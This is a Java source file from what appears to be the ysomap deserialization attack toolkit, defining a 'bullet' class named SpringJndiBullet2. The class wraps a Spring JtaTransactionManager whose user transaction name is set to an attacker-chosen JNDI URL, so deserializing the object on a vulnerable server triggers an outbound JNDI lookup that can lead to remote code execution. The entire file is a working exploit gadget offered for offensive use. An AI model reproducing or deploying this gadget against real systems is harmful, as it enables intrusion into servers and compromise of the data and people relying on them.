package ysomap.bullets.spring;

import org.springframework.transaction.jta.JtaTransactionManager;
import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3p1g
 * @since 2021/8/5
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("向外发起JNDI连接")
@Targets({Targets.JDK})
@Dependencies({"javax.transaction:jta:1.1","spring-tx"})
public class SpringJndiBullet2 extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "jndiURL", detail = "向外发起JNDI连接")
    public String jndiURL;


    @Override
    public Object getObject() throws Exception {
        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(jndiURL);
        return manager;
    }

    public static SpringJndiBullet2 newInstance(Object... args) throws Exception {
        SpringJndiBullet2 bullet = new SpringJndiBullet2();
        bullet.set("jndiURL", args[0]);
        return bullet;
    }
}
